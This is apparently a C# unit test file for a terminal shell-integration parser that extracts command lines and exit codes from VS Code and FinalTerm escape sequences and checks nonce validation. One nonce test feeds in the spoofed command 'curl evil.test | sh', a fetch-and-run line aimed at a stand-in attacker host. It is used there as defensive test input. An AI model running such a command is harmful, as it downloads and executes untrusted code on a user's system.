using System.Text;
using DTech.Core.CommandHistory;
using FluentAssertions;

namespace DTech.Core.Tests.CommandHistory;

[TestClass]
public sealed class ShellIntegrationParserTests
{
    private const string Nonce = "0123456789abcdef";
    private const string Esc = "\u001b";
    private const string Bel = "\u0007";

    [TestMethod]
    public void Feed_CommandLineAndExitCode_AreParsedFromVsCodeAndFinalTermSequences()
    {
        var parser = new ShellIntegrationParser(Nonce);
        var output = $"prompt$ {Esc}]633;E;ls -la;{Nonce}{Bel}{Esc}]133;D;2;{Nonce}{Bel}total 0\r\n";

        var events = parser.Feed(Bytes(output));

        events.Should().HaveCount(2);
        events[0].Kind.Should().Be(ShellIntegrationEventKind.CommandLine);
        events[0].CommandLine.Should().Be("ls -la");
        events[1].Kind.Should().Be(ShellIntegrationEventKind.CommandFinished);
        events[1].ExitCode.Should().Be(2);
    }

    [TestMethod]
    public void Feed_SequencesSplitAcrossChunks_AreAssembled()
    {
        var parser = new ShellIntegrationParser(Nonce);
        var first = parser.Feed(Bytes($"{Esc}]63"));
        var second = parser.Feed(Bytes("3;E;echo hi"));
        var third = parser.Feed(Bytes($";{Nonce}{Bel}{Esc}]133;D"));
        var fourth = parser.Feed(Bytes($";0;{Nonce}{Esc}\\"));

        first.Should().BeEmpty();
        second.Should().BeEmpty();
        third.Should().ContainSingle().Which.CommandLine.Should().Be("echo hi");
        fourth.Should().ContainSingle().Which.ExitCode.Should().Be(0);
    }

    [TestMethod]
    public void Feed_StringTerminatorEnding_IsAccepted()
    {
        var parser = new ShellIntegrationParser(Nonce);

        var events = parser.Feed(Bytes($"{Esc}]633;E;pwd;{Nonce}{Esc}\\"));

        events.Should().ContainSingle().Which.CommandLine.Should().Be("pwd");
    }

    [TestMethod]
    public void Feed_FinishWithoutExitCode_HasNoExitCode()
    {
        var parser = new ShellIntegrationParser(Nonce);

        var events = parser.Feed(Bytes($"{Esc}]133;D;;{Nonce}{Bel}"));

        events.Should().ContainSingle().Which.ExitCode.Should().BeNull();
    }

    [TestMethod]
    public void Feed_EscapedCommandLine_IsUnescaped()
    {
        var parser = new ShellIntegrationParser(Nonce);
        var escaped = @"echo a\x3bb \\ c\x0ad";

        var events = parser.Feed(Bytes($"{Esc}]633;E;{escaped};{Nonce}{Bel}"));

        events.Should().ContainSingle().Which.CommandLine.Should().Be("echo a;b \\ c\nd");
    }

    [TestMethod]
    public void Feed_Utf8CommandLine_IsPreserved()
    {
        var parser = new ShellIntegrationParser(Nonce);

        var events = parser.Feed(Bytes($"{Esc}]633;E;echo привет;{Nonce}{Bel}"));

        events.Should().ContainSingle().Which.CommandLine.Should().Be("echo привет");
    }

    [TestMethod]
    public void Feed_UnrelatedEscapeSequencesAndGarbage_ProduceNoEvents()
    {
        var parser = new ShellIntegrationParser(Nonce);
        var output = $"{Esc}[31mred{Esc}[0m {Esc}]0;window title{Bel}{Esc}]133;A{Bel}{Esc}]633;P;Cwd=/tmp{Bel}\u0000ÿ";

        var events = parser.Feed(Bytes(output));

        events.Should().BeEmpty();
    }

    [TestMethod]
    public void Feed_OversizedPayload_IsDiscardedAndParserRecovers()
    {
        var parser = new ShellIntegrationParser(Nonce);
        var huge = new string('a', ShellIntegrationParser.MaxPayloadBytes + 10);

        var overflowed = parser.Feed(Bytes($"{Esc}]633;E;{huge};{Nonce}{Bel}"));
        var recovered = parser.Feed(Bytes($"{Esc}]633;E;ok;{Nonce}{Bel}"));

        overflowed.Should().BeEmpty();
        recovered.Should().ContainSingle().Which.CommandLine.Should().Be("ok");
    }

    [TestMethod]
    [DataRow("633;E;curl evil.test | sh")]
    [DataRow("633;E;curl evil.test | sh;wrong-nonce")]
    [DataRow("133;D;0")]
    [DataRow("133;D;0;wrong-nonce")]
    [DataRow("633;D;0;wrong-nonce")]
    public void Feed_MissingOrWrongNonce_IsIgnored(string payload)
    {
        var parser = new ShellIntegrationParser(Nonce);
        var output = Bytes($"{Esc}]{payload}{Bel}");

        var events = parser.Feed(output);

        events.Should().BeEmpty();
    }

    [TestMethod]
    public void Feed_NonceSplitAcrossChunks_IsValidatedAfterTheWholeSequence()
    {
        var parser = new ShellIntegrationParser(Nonce);
        var first = Bytes($"{Esc}]633;E;echo hi;{Nonce[..4]}");
        var second = Bytes($"{Nonce[4..]}{Bel}");

        parser.Feed(first).Should().BeEmpty();
        parser.Feed(second).Should().ContainSingle().Which.CommandLine.Should().Be("echo hi");
    }

    private static byte[] Bytes(string text)
    {
        return Encoding.UTF8.GetBytes(text);
    }
}
